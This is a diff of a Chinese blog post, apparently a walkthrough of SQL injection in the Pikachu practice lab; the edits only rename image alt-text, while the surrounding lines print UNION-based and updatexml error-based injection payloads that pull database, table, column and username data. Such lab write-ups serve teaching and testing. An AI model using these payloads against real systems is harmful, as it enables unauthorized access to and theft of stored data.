@@ -106,17 +106,17 @@ SQL注入就是指Web应用程序对用户输入数据的合法性没有判断�
 
 1.输入`1'`报错，输入`1'#`返回正常
 
-![D$ZI5){)R3%}C332N}9}}~9.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/D%24ZI5)%7B)R3%25%7DC332N%7D9%7D%7D%7E9.png)
+![D$ZI5R3%C332N9~9.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/D%24ZI5)%7B)R3%25%7DC332N%7D9%7D%7D%7E9.png)
 
-![WSNH81ZS7$7{6QT(W9V(MJU.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/WSNH81ZS7%247%7B6QT(W9V(MJU.png)
+![WSNH81ZS7$76QTW9VMJU.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/WSNH81ZS7%247%7B6QT(W9V(MJU.png)
 
 2.用 order by 判断列数`1' order by 4#`
 
-![HMUGZ(FQTHL9QA$]H@IZE4C.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/HMUGZ(FQTHL9QA%24%5DH%40IZE4C.png)
+![HMUGZFQTHL9QA$]H@IZE4C.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/HMUGZ(FQTHL9QA%24%5DH%40IZE4C.png)
 
 3.union看回显`-1' union select 1,2,3#`
 
-![BTF_4TN87CJHCWC{71(Y65S.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/BTF_4TN87CJHCWC%7B71(Y65S.png)
+![BTF_4TN87CJHCWC71Y65S.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/BTF_4TN87CJHCWC%7B71(Y65S.png)
 
 4.爆库名`-1' union select 1,database(),3#`
 
@@ -128,7 +128,7 @@ SQL注入就是指Web应用程序对用户输入数据的合法性没有判断�
 
 6.爆列名`-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users'),3#`
 
-![_HS%PDJM}GKG8MAKR}Q`)D4.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/_HS%25PDJM%7DGKG8MAKR%7DQ%60)D4.png)
+![_HS%PDJMGKG8MAKRQ`D4.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/_HS%25PDJM%7DGKG8MAKR%7DQ%60)D4.png)
 
 7.查看username字段`-1' union select 1,(select group_concat(username) from pikachu.users),3#`
 
@@ -144,7 +144,7 @@ SQL注入就是指Web应用程序对用户输入数据的合法性没有判断�
 
 1.输入`1')`报错，输入`1')#`返回正常
 
-![ZLYA9Z)Y4W$PZ8AY$8ML5XE.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/ZLYA9Z)Y4W%24PZ8AY%248ML5XE.png)
+![ZLYA9ZY4W$PZ8AY$8ML5XE.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/ZLYA9Z)Y4W%24PZ8AY%248ML5XE.png)
 
 ![QQ图片20200305125820.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305125820.png)
 
@@ -158,7 +158,7 @@ SQL注入就是指Web应用程序对用户输入数据的合法性没有判断�
 
 4.爆列名`-1') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users'),0x7e),1)#`
 
-![KXM(4JDV}@Q{}7CWL]Q%EEF.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/KXM(4JDV%7D%40Q%7B%7D7CWL%5DQ%25EEF.png)
+![KXM4JDV@Q7CWL]Q%EEF.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/KXM(4JDV%7D%40Q%7B%7D7CWL%5DQ%25EEF.png)
 
 5.爆字段`-1') and updatexml(1,concat(0x7e,(select group_concat(username) from pikachu.users),0x7e),1)#`
 
